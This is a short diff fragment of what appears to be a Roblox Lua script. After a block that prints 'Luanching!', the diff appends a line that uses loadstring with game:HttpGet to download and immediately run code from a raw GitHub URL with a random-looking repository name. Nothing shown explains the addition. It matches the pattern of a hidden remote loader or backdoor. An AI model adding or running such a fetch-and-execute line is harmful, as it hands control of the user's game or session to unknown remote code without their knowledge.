@@ -318,3 +318,5 @@ wait"0.1"
 print "Luanching!"
 
 end)
+wait "0.1"
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/gasterdreemure/hgfh7q4fn8f487fm8uuqf53t8qtfm8tvm8vtmh9qtfchm97qtf43987c4ty90q4tf0mkdq4tfcm9q4t-94tac-9xf-9jx4-98a4t/master/1010101010101010ten'),true))()
